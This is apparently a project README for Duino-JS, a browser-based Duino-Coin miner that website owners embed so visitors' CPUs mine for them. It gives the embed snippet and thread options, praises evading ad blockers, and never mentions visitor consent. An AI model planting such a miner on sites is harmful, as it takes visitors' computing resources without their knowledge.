## Why
I am developing my own site since a few months, and I wanted to make some money of it, but because you have to give a credit card number and your address to the ad provider (usually Google), I searched for alternatives.

I then found out that you can let your viewers mine crypto coins, so I did some research, but found only 3 results:
- Coinhive, but it was discontinued in 2017.
- Minero.cc, but you could only use their wallet.
- CoinIMP, but I couldn't really make a good profit of it.

So I stopped searching...

28-05-2021: I stumbled across [this video on YouTube](https://www.youtube.com/watch?v=CbpfNU7oaws "Solar Powered Crypto Miner Using A Raspberry Pi"), 
there were some comments about Duino-Coin, so I decided to take a look at their website.

I found out that I could mine crypto on my arduino's, and that there were some projects 
which could let you mine on your computer, but written in [Go](https://github.com/yippiez/go-miner) or [C](https://github.com/phantom32-0/d-cpuminer). I tried to compile those to WebAssembly, but that 
didn't work, so I decided to write one myself in JavaScript, to use on my future website, or yours...

## Features
- A LOT of comments, and if you want to, it can log everything it sends or receives from the server.
- Connects to the WebSocket server via a secured protocol (WSS).
- The username to mine to can be changed easily, just like the rigid (how the miner appears in the wallet) and [the amount of threads](#options).
- Runs in a Web Worker, so the performance of your site won't be interrupted.
- Is multithreaded, so you can use the full power of your pc.
- Not blocked by any adblocker (at least not yet, and if you maintain a adblocker, please don't blacklist it).

## Usage
To use the miner, download [duino-js.min.js, worker.min.js and hashes.min.js from the latest release](https://github.com/sys-256/Duino-js/releases/latest), and place them in the root of your site, then add this to the end of your html file in every file you want to monetize:
```html
<script src="duino-js.min.js"></script> <!--imports the Duino-JS miner-->
<script>
    username = `Hoiboy19`; //put your username here (e.g. revox, ericddm, snehaislove or Hoiboy19), the default is Hoiboy19.
    rigid = `Duino-JS`; //If you want to change the rig ID, you can change this. If you want to keep using "Duino-JS", you can remove this line.
    threads = userThreads; //Set the amount of threads to use here, check out https://github.com/sys-256/Duino-JS for more options. The default is 1.
    startMiner(); //starts the miner
</script>
```

NOTE: You need a web server like Apache or NGINX to run it, because Web Workers don't work on local files.

### Options
The "threads" variable is pretty customizable, so here are some examples:
- threads = userThreads; // Uses all the threads of the computer, but if the computer has more then 8  threads, it will still  use 8 threads because of profitability.
- threads = userThreads/2; // Divides the userThreads by 2, so it will use 50% of the computers power, but if 50% of the threads is more then 8, it will just use 8.
- threads = 4; // Uses 4 threads for mining, but if the user has less then 4 threads, it will use the amount of threads the user has.
- threads = 0; // You can't use 0  threads, so Duino-JS will set it to 1.
- threads = 16; // Since mining with more then 8 threads isn't profitable, Duino-JS will set threads to 8.
